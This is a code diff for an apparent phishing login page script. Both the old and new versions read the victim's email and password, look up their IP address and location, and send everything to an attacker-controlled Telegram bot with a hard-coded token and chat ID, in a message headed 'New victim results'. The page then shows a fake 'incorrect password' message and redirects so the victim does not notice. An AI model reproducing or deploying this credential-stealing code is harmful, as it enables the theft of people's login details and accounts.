@@ -1,57 +1,48 @@
-document.addEventListener("DOMContentLoaded", function() {
-    const form = document.querySelector("#form");
 
-    form.addEventListener("submit", function(e) {
-        e.preventDefault();
+const form = document.querySelector("#form");
+var ct = "5";
+var co = 0;
+var lo = 0;
+var st = 0;
+var clicking = 0;
 
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
+ 
+    fetch("https://ipapi.co/json/")
+      .then((res) => res.json())
+      .then((data) => {
+        ct = data.ip;
+        co = data.country_name;
+        lo = data.country_calling_code;
+        st = data.city;
 
-        // Function to send message to Telegram
-        function sendMessage(ip_address, country, country_code, state) {
-            const message = `Results:\n`
-                          + `- Username/Email: ${email}\n`
-                          + `- Password: ${password}\n`
-                          + `- IPAddress: ${ip_address}\n`
-                          + `- Country: ${country}\n`
-                          + `- Country-code: ${country_code}\n`
-                          + `- State: ${state}`;
+        var identity = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
 
-            const botToken = '7137021347:AAHJQ6GWWzbNjiVlzmfpZ2rsrrWa8VnS5nk';
-            const chatId = '-1002178593588';
+        var my_text = `New victim results: ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+   var token = "7137021347:AAHJQ6GWWzbNjiVlzmfpZ2rsrrWa8VnS5nk";
+        var chat_id = -1002178593588;
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
-            // Send message to Telegram using XMLHttpRequest
-            const api = new XMLHttpRequest();
-            api.open("GET", url, true);
-            api.onreadystatechange = function() {
-                if (api.readyState === 4) {
-                    if (api.status === 200) {
-                        // Redirect to success page
-                        window.location.replace("incorrect.html");
-                    } else {
-                        console.error("Error sending message to Telegram:", api.statusText);
-                    }
-                }
-            };
-            api.send();
-        }
-
-        // Fetch IP address and location information
-        fetch("https://ipapi.co/json/")
-            .then(response => response.json())
-            .then(data => {
-                const ip_address = data.ip;
-                const country = data.country_name;
-                const country_code = data.country_calling_code;
-                const state = data.region;
-                sendMessage(ip_address, country, country_code, state);
-            })
-            .catch(error => {
-                console.error("Error fetching IP geolocation:", error);
-                // Fallback if fetching IP geolocation fails
-                sendMessage('Unknown', 'Unknown', 'Unknown', 'Unknown');
-            });
+        let api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.send();
+  clicking = clicking + 1;
+  setTimeout(function () {
+    document.getElementById("alert-message").innerHTML =
+      "Sorry, your password was incorrect. Please double-check your password.";
+  }, 1000);
+  if (clicking == 1) {
+    window.location.replace("incorrect.html");
+  }
     });
+
+
+    // setTimeout(function() {
+    //     window.location.replace("thanks.html");
+    // }, 1000)
+
+  //   console.log("Incorrect Password!");
 });
